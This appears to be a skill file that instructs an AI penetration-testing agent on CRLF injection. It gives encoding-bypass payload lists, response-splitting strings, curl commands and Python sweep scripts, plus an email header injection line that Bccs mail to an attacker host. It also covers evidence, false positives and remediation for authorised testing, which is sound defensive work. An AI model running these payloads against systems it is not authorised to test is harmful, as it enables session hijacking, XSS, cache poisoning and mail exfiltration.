---
name: crlf-injection
description: "CRLF injection — header splitting, response splitting, log injection, and request smuggling preconditions"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - crlf
  - header-injection
  - web
  - smuggling
  - attack
tech_stack:
  - web
  - nginx
cwe_ids:
  - CWE-113
  - CWE-93
chains_with:
  - attack-request-smuggling
  - attack-cache-poison
prerequisites: []
severity_boost:
  attack-cache-poison: "CRLF in a cached response = persistent header injection for every user"
  attack-request-smuggling: "CRLF is the primitive that constructs the smuggled request"
---

# CRLF Injection

> **AI LOAD INSTRUCTION**: CRLF injection is the ability to insert `\r\n` (or a decoded
> equivalent) into a value that is later placed into an HTTP header, a response body, or a
> log. **The impact depends entirely on where the injected value lands**, and this is where
> most reports go wrong.
>
> Three distinct outcomes, in ascending severity:
> **log injection** (forge log entries, poison a SIEM) —
> **header injection** (set cookies, redirects, CORS headers the server never intended) —
> **response splitting** (inject an entire second response, enabling stored XSS and cache
> poisoning).
>
> Modern frameworks encode `\r` and `\n` in headers, so **raw CRLF rarely works.** The work is
> in the encoding bypass: double-encoding, Unicode normalisation, and the many ways `%0d%0a`
> can survive one decode pass and be decoded later by a different component. **Test the
> encoded variants even when the raw one fails** — a filter that strips literal CRLF but
> decodes once afterwards is the common case.

## 0. RELATED ROUTING

- [attack-request-smuggling](../attack-request-smuggling/SKILL.md) — CRLF as the construction primitive
- [attack-cache-poison](../attack-cache-poison/SKILL.md) — splitting a cached response
- [attack-host-header](../attack-host-header/SKILL.md) — the same header-trust gap, no CRLF needed
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — the usual outcome of response splitting
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) — a related parser-disagreement class
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — separating log injection from response splitting

---

## 1. WHERE CRLF LANDS — THE THREE OUTCOMES

Establish which of the three you have. They are different findings with different severities.

### 1.1 Log injection

The value goes into a log file with no sanitisation. You forge log entries.

```text
username=admin\r\n2026-09-12 14:02:11 INFO User admin logged in from 10.0.0.1
```

**Why it matters:** SIEM alerting, forensic timelines, and audit trails are corrupted. A forged
entry can hide a real one or frame another account. It is **low-to-medium severity** on its
own — the affected artefact is a log, not an access control.

**The finding requires the log to be consumed by something.** If logs are only read by a human
occasionally, severity is low. If a SIEM parses them and alerts on them, log forging can
suppress detection — that is a real security control failure.

### 1.2 Header injection

The value lands in a response header. You add headers the application never set.

```text
/profile?name=x%0d%0aSet-Cookie:sess=attacker
```

| Injected header | Effect |
|---|---|
| `Set-Cookie` | session fixation |
| `Location` | open redirect |
| `Access-Control-Allow-Origin: *` | CORS policy bypass with credentials |
| `Content-Type: text/html` | turns a non-HTML response into one that renders |
| `Content-Security-Policy` | **weaken the CSP, then exploit an existing XSS** |
| `X-Frame-Options` | enable clickjacking |
| `Cache-Control` | cache a private response publicly |

**The CSP-weakening angle is underrated.** Injecting a permissive `Content-Security-Policy`
header may override a strict one and enable an XSS that was previously unexploitable.

### 1.3 Response splitting

Two `CRLF CRLF` sequences end the header block and start a **second response**:

```text
value=x%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
```

The client sees the first response end and the second begin. **This is the highest severity
outcome** because it yields full response control — stored XSS if the split response is cached,
or cache poisoning if the front-end caches it.

**Test response splitting only where you can observe the parsed response.** If the client
receives one well-formed response, splitting did not work regardless of what the raw bytes
contain.

---

## 2. INPUT SURFACES

**Where CRLF payloads are commonly accepted:**

| Surface | Typical parameter |
|---|---|
| redirect / return URLs | `url`, `next`, `return`, `redirect` |
| URL path segments | `/foo%0d%0a...` |
| cookies | a value the app echoes into a header |
| user-agent / referer | logged or reflected |
| file names in a listing | `Content-Disposition` construction |
| form fields echoed in headers | `X-User: <input>` |
| API keys or tokens | echoed into a response header |
| language / locale | used to build `Content-Language` |
| callback URLs | echoed into `Link` headers |
| SMTP fields | email header injection (see below) |

**Email header injection is the same bug in a different protocol** and is frequently critical:
`From`, `To`, `Subject` built from user input lets you add `Bcc:` and exfiltrate every message
the application sends, or inject a new body:

```text
email=victim@example.com%0d%0aBcc:attacker@evil.com
subject=Hello%0d%0a%0d%0aNew body content
```

**Test the email path explicitly.** It is a separate input surface, a separate finding class,
and it is often forgotten because it lives outside the HTTP response.

---

## 3. ENCODING BYPASSES

Raw `%0d%0a` is usually blocked. These variants survive specific filters.

**Basic and encoded:**

```text
%0d%0a              raw URL-encoded CRLF
%0a                 LF only — some parsers accept it alone
%0d                 CR only
%0D%0A              uppercase
\r\n                literal backslash-r-backslash-n (sometimes decoded later)
```

**Double encoding — the most reliable:**

```text
%250d%250a          %0d%0a after one decode pass
%250D%250A
```

**The mechanism:** the filter decodes once and sees `%0d%0a` (a harmless string), passes it
through, and a *second* component decodes it into real CRLF. **This is the single most common
way CRLF injection survives a filter** — test it first after raw fails.

**Unicode and normalisation:**

```text
%E5%98%8A%E5%98%8D      U+560A U+560D — normalised to CRLF by some ICU/Java paths
%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D
%u000d%u000a            IIS / legacy ASP.NET %u encoding
%c0%8d%c0%8a            overlong UTF-8
%ef%bc%8d               full-width hyphen — rarely useful, but normalisation bugs surface here
```

**The Unicode normalisation family is worth trying specifically on Java and .NET** targets,
where a normalisation step runs after validation.

**Structural variants:**

```text
%0d%0a%09            CRLF + tab (some parsers fold the next line)
%0d%0a%20            CRLF + space (obs-fold)
%0d%0a%0d            a truncated split
%0d%0a%0a            uneven pair — parser-dependent
%E3%80%80%0d%0a      ideographic space prefix
```

**Whitespace and folding variants bypass parsers that require a header name immediately after
CRLF** — obs-fold continuation is deprecated in HTTP/1.1 and removed in HTTP/2, but many
HTTP/1.1 servers still accept it.

---

## 4. CONFIRMING THE INJECTION

**The reliable test: inject a header with an unmistakable value and read the response.**

```bash
curl -s -i "https://TARGET/redirect?url=x%0d%0aX-Injected:%20ltxcanary" | head -20
```

**Read the raw response, not a rendered view.** Most proxies and clients normalise headers,
and a tool that shows you a parsed header table may hide an injected one. Use `curl -i` and
inspect the raw bytes, or a proxy's raw view.

**For a `Set-Cookie` injection:**

```bash
curl -s -i "https://TARGET/profile?name=x%0d%0aSet-Cookie:%20ltxcanary=1" | grep -i 'set-cookie'
```

Two `Set-Cookie` headers, one of them yours, proves the injection. **Confirm the browser
actually stores the injected cookie** — a header in the response that the browser rejects
(a malformed value, a mismatched domain) is not an effective injection.

**For response splitting, verify the second response is parsed:**

```bash
curl -s -i "https://TARGET/x?p=%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

If the output shows one response with your payload inside a header, splitting failed. If it
shows a second `HTTP/1.1 200 OK` block, it worked.

**The client is the arbiter.** Some HTTP clients reject a response containing an embedded
response; some caches store the second; some browsers render it. **Test with the client the
application actually serves** — a finding that only reproduces in `curl` may not be
exploitable in a browser, and vice versa.

---

## 5. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| Response splitting yielding stored XSS or cache poisoning | **Critical (P1)** | the split response and execution in a browser |
| Email header injection enabling Bcc exfiltration | **Critical (P1)** | the injected headers in the sent message |
| `Set-Cookie` injection with a cookie the browser stores | **High (P2)** | the header and the stored cookie |
| CSP or security-header weakening | **High (P2)** | the injected header and the enabled exploit |
| `Access-Control-Allow-Origin` injection | **High (P2)** | the injected header and a cross-origin read |
| `Location` injection (open redirect) | **Medium (P3)** | the `Location` header |
| Header injection with no observable client effect | **Low (P4)** | the header only |
| Log injection affecting SIEM parsing | **Medium (P3)** | the forged entry and its effect on alerting |
| Log injection with no downstream consumer | **Low (P4)** | the forged entry |

**Separate log injection from response splitting in the report.** They are different findings;
conflating them either inflates the log issue or buries the real one.

---

## 6. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the request with the encoded payload | the trigger |
| **the raw response bytes** (`curl -i` or a proxy raw view) | proves the header block was modified |
| the specific header injected, and its value | the outcome |
| for `Set-Cookie`: the browser's stored cookie | proves the client accepted it |
| for splitting: the second response block, parsed | proves a real split, not reflection |
| for email injection: the received message with the injected headers | the impact proof |
| for CSP weakening: the injected header and the XSS it enables | the full chain |
| the encoding that worked (raw / double / unicode / obs-fold) | the filter bypass is the finding |
| a **control** request with a benign value | proves the injection, not a proxy artefact |

**Raw bytes are essential.** A rendered header table in a report is not evidence — the finding
is about byte-level parsing.

**False positives to exclude:**

| Looks like CRLF injection | Actually |
|---|---|
| the payload appears reflected in the body, not in a header | body reflection, not header injection |
| your proxy normalised the response and added a header | check the raw bytes |
| the injected `Set-Cookie` has an invalid value | the browser rejects it |
| the split response is not parsed by any client | no real split |
| the "forged" log entry is your own request being logged | normal logging |
| the header injection has no consumer | low severity, not critical |
| the value is percent-encoded in the response | no CRLF reached the header |

---

## 7. REMEDIATION REFERENCE

1. **Reject `\r` and `\n` in any value destined for a header** — validate at the point the value is accepted, not at the point it is emitted. Denylist the control characters, and reject rather than strip so the failure is visible.
2. **Use a framework API that encodes header values** — the modern frameworks (`Content-Disposition` builders, structured header helpers, `header()` with encoding) reject control characters. Do not construct header strings by concatenation.
3. **Encode output, do not sanitise input alone** — escaping `\r\n` at the emission point is a defence that survives double-decoding, which input filtering does not.
4. **Canonicalise before validating** — decode once, normalise Unicode, then validate. Validating before decoding is precisely the gap that double-encoding exploits.
5. **Sanitise log output structurally** — write logs as structured records (JSON) rather than concatenated strings. A log entry cannot be forged if the newline is encoded by the serialiser.
6. **Validate email address and subject fields against a strict pattern** — reject anything containing CRLF or additional header-like syntax. Use a mail library that encodes headers rather than building them.
7. **Never reflect a request header into a response header unencoded** — the `Referer`, `User-Agent`, and custom headers are all attacker-controlled inputs.
8. **Test header emission in CI** — a test that supplies CRLF in every parameter feeding a header and asserts the raw response contains no injected line catches regressions cheaply.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a **new header** appear in the response, or did the value merely contain your text? | injection, not reflection |
| 2 | Was there a **control** with the encoded-but-inert variant? | the CRLF is the cause |
| 3 | Did you **set a cookie or inject a body**, or only add a header? | the impact class |
| 4 | Did the injected header **take effect in a browser** (a redirect, a cookie)? | a real client consequence |
| 5 | Did you test **both `%0d%0a` and the bare-`%0a` form**, and the header-folded form? | the parser reach |
| 6 | Do the bytes survive the **proxy and the application server** intact? | the injection point |
| 7 | Did you confirm the response is **not served from cache**? | a stale response is not your injection |

**A new header line in the raw response is the bar.** Any CRLF appearing inside a header *value* without
creating a new line is not an injection, and reporting it is the standard error here.

---

## 9. EXECUTION PRIMITIVES

CRLF injection is proven by **a raw response containing a header line you created, with the inert
control**. Every block ends at a new header, a set cookie, or an injected body.

### 9.1 The control pair, read with `--raw` so the bytes are visible

```bash
HOST="https://target.example"
# THE INERT CONTROL: the same value with the CR sequence encoded so it cannot terminate the header
curl -sS --raw -D- -o /dev/null "$HOST/redirect?url=%2Fdashboard%250d%250aX-Control%3A%201" 2>&1 | head -20
# THE CANDIDATE: the same value with live CRLF
curl -sS --raw -D- -o /dev/null "$HOST/redirect?url=%2Fdashboard%0d%0aX-Injected%3A%201" 2>&1 | head -20
# and the bare LF form, which some servers accept alone
curl -sS --raw -D- -o /dev/null "$HOST/redirect?url=%2Fdashboard%0aX-Injected-LF%3A%201" 2>&1 | head -20
```

**Use `--raw` and read the header block.** A normalised client hides the difference between a value
containing `\r\n` and an actual header break, and that difference is the entire finding.

### 9.2 The injection points worth testing

```bash
HOST="https://target.example"
INJ='%0d%0aX-Injected%3A%20yes'
# the classic set: a redirect target, a lang or locale, a filename, and a tracking value
for path in \
  "/redirect?url=%2F$INJ" \
  "/?lang=en$INJ" \
  "/download?file=report.pdf$INJ" \
  "/api/v1/set-preference?theme=dark$INJ" \
  "/?utm_source=email$INJ" \
  "/login?next=%2F$INJ" ; do
  printf '%-52s ' "$path"
  curl -sS --raw -D- -o /dev/null "$HOST$path" 2>/dev/null | grep -ci 'x-injected' | sed 's/^/injected-headers=/'
done
# and the cookie-setting impact, which is the highest-value outcome
curl -sS --raw -D- -o /dev/null "$HOST/redirect?url=%2F%0d%0aSet-Cookie%3Asession%3Dpentest%3B%20Path%3D%2F" 2>&1 | grep -iE 'set-cookie|HTTP/'
```

**Each path is a separate injection point.** A `lang` parameter reaches a `Content-Language` header, a
filename reaches `Content-Disposition`, and a redirect target reaches `Location` - the impact differs by
which header the value lands in.

### 9.3 The response-splitting form, where the injection reaches a body

```bash
# a server that reflects the value into the body after the headers can be made to inject a whole response
curl -sS --raw "$HOST/redirect?url=%0d%0a%0d%0a<html>pentest-marker</html>" 2>&1 | tail -20
# and the cache-poisoning form, where the split response is stored for other users - note it, do not do it
python3 - <<'PY'
print("a response-split into a cacheable object is a cache-poisoning primitive; confirm the caching layer")
print("first and treat any poisoning of a shared cache as a scope question for the client.")
PY
# the confirmation that the injected body bytes reached the client
curl -sS --raw "$HOST/redirect?url=%0d%0a%0d%0aPENTEST-BODY-MARKER" 2>&1 | grep -c 'PENTEST-BODY-MARKER'
```

**The marker appearing after the header block is the response-splitting finding.** A single injected
header is one finding; a split response that a shared cache stores is a different and much more serious
one, and it needs the client's explicit agreement.

### 9.4 Finding the injection point when the obvious parameters do not work

```bash
HOST="https://target.example"
# a bulk sweep across every parameter the site reflects, testing for the injected header
curl -sS "$HOST/" | grep -oE 'href="[^"]*\?[^"]*"' | sed 's/href="//;s/"//' | head -20
python3 - <<'PY'
import requests, urllib.parse
HOST = "https://target.example"
PATHS = ["/", "/login", "/search", "/api/v1/user", "/redirect", "/download"]
PARAMS = ["url", "next", "lang", "locale", "file", "path", "redirect", "return", "ref", "callback", "q"]
MARK = "X-Inj-Probe"
for path in PATHS:
    for p in PARAMS:
        v = "/x%0d%0a" + MARK + "%3A%201"
        try:
            r = requests.get(f"{HOST}{path}", params={p: v}, timeout=8, allow_redirects=False)
            hit = MARK.lower() in "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            print(f"{path:20} {p:10} status={r.status_code} injected={hit}")
        except Exception as e:
            print(f"{path:20} {p:10} ERROR {type(e).__name__}")
PY
```

**The sweep is how the injection point is found when the obvious parameter is sanitised.** The hit is in
the header mapping, not the body, and `r.headers` flattens it precisely so the test can detect it.

### 9.5 The end-to-end harness

```bash
python3 - <<'PY'
import requests
HOST = "https://target.example"
TARGETS = [
    ("/redirect", "url", "/x"),
    ("/", "lang", "en"),
    ("/download", "file", "a.pdf"),
]
PAYLOADS = {
    "inert-control": "%250d%250aX-Probe%3A%201",
    "crlf":          "%0d%0aX-Probe%3A%201",
    "lf-only":       "%0aX-Probe%3A%201",
    "cr-only":       "%0dX-Probe%3A%201",
    "utf8-nel":      "%c2%85X-Probe%3A%201",
}
print("%-22s %-10s %-18s %-8s %s" % ("path", "param", "payload", "status", "new-header?"))
for path, p, base in TARGETS:
    for name, pl in PAYLOADS.items():
        try:
            r = requests.get(f"{HOST}{path}", params={p: base + pl}, timeout=8, allow_redirects=False)
            raw = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            print("%-22s %-10s %-18s %-8s %s" % (path, p, name, r.status_code, "X-Probe" in raw))
        except Exception as e:
            print("%-22s %-10s %-18s ERROR %s" % (path, p, name, type(e).__name__))
print()
print("A finding is a row where the inert control is False and the crlf row is True,")
print("AND the response is not served from a cache. Everything else is a value containing text.")
PY
```

**The inert control in the same table is what makes it a finding.** The encode-once variant passes through
the same code path without terminating a header, so the difference between the two rows is the whole
finding.

---

## 10. EVIDENCE STANDARD — SPLIT ARTEFACTS

| Item | Why |
|---|---|
| The **raw response header block** showing the injected line | the finding itself |
| The **inert control** (the same value encoded once) | proves the CRLF is the mechanism |
| The **exact parameter, path, and payload** | reproducibility |
| The **injected header's effect** (a cookie, a redirect, a body) | the impact class |
| Whether the injection reached **headers only or the body** | response splitting is materially worse |
| Whether a **cache** stored the response | the poisoning precondition |
| The **proxy and server** product and version, when visible | parser behaviour differs |
| The **client that acted on the injected header** | a browser consequence is stronger evidence |
| That the response was **not from cache** | a stale response invalidates the test |
| Confirmation that **no cache was poisoned** beyond the scope agreed with the client | operational safety |

Report the **raw blocks**: "`GET /redirect?url=%2Fdashboard%250d%250aX-Control%3A%201` returns a header
block with no `X-Control` line, which is the inert control. The same request with
`url=%2Fdashboard%0d%0aX-Injected%3A%201` returns a header block containing a separate `X-Injected: 1`
line, and a variant setting `Set-Cookie: session=pentest; Path=/` produced a second `Set-Cookie` header
that a browser stored, which is the impact. The application server is nginx 1.24 in front of an
application that reflects the `url` parameter into `Location` without filtering control characters. No
response was cached and no client data was affected", never "the application is vulnerable to CRLF
injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A CRLF appearing **inside a header value** without creating a new line | not an injection |
| The string `%0d%0a` appearing **still encoded** in the response | the value was not decoded |
| An injected header on a **response served from a cache** | a stale object, not your injection |
| A normalised client showing nothing | use `--raw`; the client may hide it |
| A parameter echoed into a **`Set-Cookie` value** without a new header | a value, not a header |
| A redirect that **changes the `Location` value** only | a redirect finding, already covered by open-redirect |
| An injection into a **response the client cannot be made to fetch** | no attack path |
| A finding without the **inert control** | the mechanism is unproven |
| A response-split into a **shared cache without the client's agreement** | an operational violation, not a finding |
| A `500` error page containing your marker | an error message, not a split |
| A session value reproduced in full | a disclosure |

**A new header line, the inert control, and no cache.** This family fails when a `%0d%0a` in a value is
reported as a header injection; the raw block with the control is what distinguishes them.

---

## 11. REMEDIATION REFERENCE — SPLIT HARDENING

1. **Strip or reject CR, LF, and NUL in every value that reaches a response header, and encode the parameter before use** - the injection begins with an unfiltered control character.
2. **Use the framework's header API with a validated value rather than building header strings by concatenation** - concatenation is what allows a newline to become a header separator.
3. **Validate `Location` targets against an allowlist of paths after parsing** - it removes both the open-redirect and the CRLF injection on that header at once.
4. **Set a strict `Content-Type` and disable response splitting by never echoing user input into headers at all** - the safest fix is to remove the reflection, not to filter it.
5. **Configure the application server and proxy to reject requests containing encoded CR or LF in any parameter** - a single edge rule catches the whole class before it reaches the application.
6. **Keep the proxy and application server patched, and standardise on one that normalises control characters consistently** - many of these findings are parser differences between the two layers.
7. **Send `Cache-Control: no-store` on any response that reflects user input** - it removes the cache-poisoning escalation even if a split occurs.
8. **Separate user-influenced headers (`Location`, `Content-Disposition`, `Content-Language`) from the framework's automatic header generation** - the framework's own encoding is the control you are relying on.
9. **Log and alert on requests containing `%0d`, `%0a`, or `%00` in any parameter** - it is a high-signal detection with almost no legitimate traffic.
10. **Test the response headers for split-injection as part of the release process, with the inert control** - it is a one-assertion test and it is rarely covered.
11. **Use a WAF rule for encoded CRLF as defence in depth, never as the only control** - it is trivially bypassed by an encoding the rule does not normalise.

---

## 12. RELATED SIBLINGS - LOAD TOGETHER

- [request-smuggling](../request-smuggling/SKILL.md) - the same control-character trust at the message-framing level
- [open-redirect](../open-redirect/SKILL.md) - the finding this usually co-occurs with on a `Location` header
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) - another header the application trusts without validation
- [web-cache-deception](../web-cache-deception/SKILL.md) - the cache behaviour that turns a split into poisoning
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the parser-disagreement family this shares its theory with
